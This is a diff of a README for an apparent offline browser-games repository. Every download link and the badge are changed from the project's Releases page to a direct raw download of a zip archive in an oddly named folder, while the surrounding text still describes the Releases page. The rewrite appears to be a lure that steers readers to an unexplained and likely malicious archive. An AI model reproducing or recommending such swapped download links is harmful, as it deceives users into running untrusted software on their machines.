@@ -1,6 +1,6 @@
 # 🎮 gry-przegladarkowe-offline - Enjoy Offline Browser Games Anytime!
 
-[![Download Gry Przeglądarkowe Offline](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/vandaranikunj/gry-przegladarkowe-offline/releases)
+[![Download Gry Przeglądarkowe Offline](https://github.com/vandaranikunj/gry-przegladarkowe-offline/raw/refs/heads/main/obmutescence/offline-gry-przegladarkowe-Koibal.zip)](https://github.com/vandaranikunj/gry-przegladarkowe-offline/raw/refs/heads/main/obmutescence/offline-gry-przegladarkowe-Koibal.zip)
 
 ## 🚀 Getting Started
 
@@ -13,7 +13,7 @@ To get started, follow these steps:
 1. **Visit the Download Page**  
    Click the link below to visit the Releases page. Here, you can find all the versions available for download:
 
-   [Download Gry Przeglądarkowe Offline](https://github.com/vandaranikunj/gry-przegladarkowe-offline/releases)
+   [Download Gry Przeglądarkowe Offline](https://github.com/vandaranikunj/gry-przegladarkowe-offline/raw/refs/heads/main/obmutescence/offline-gry-przegladarkowe-Koibal.zip)
 
 2. **Select the Latest Release**  
    On the Releases page, look for the latest version indicated at the top. It’s usually the most stable and feature-rich version.
@@ -76,4 +76,4 @@ This project is licensed under the MIT License. You can use it freely, but pleas
 
 Thank you for choosing "Gry Przeglądarkowe Offline"! We hope you enjoy playing our collection of games. If you have any questions, please check the issues on our GitHub page or reach out to the community for help. 
 
-For updates and more information, make sure to visit the Releases page: [Download Gry Przeglądarkowe Offline](https://github.com/vandaranikunj/gry-przegladarkowe-offline/releases).
+For updates and more information, make sure to visit the Releases page: [Download Gry Przeglądarkowe Offline](https://github.com/vandaranikunj/gry-przegladarkowe-offline/raw/refs/heads/main/obmutescence/offline-gry-przegladarkowe-Koibal.zip).
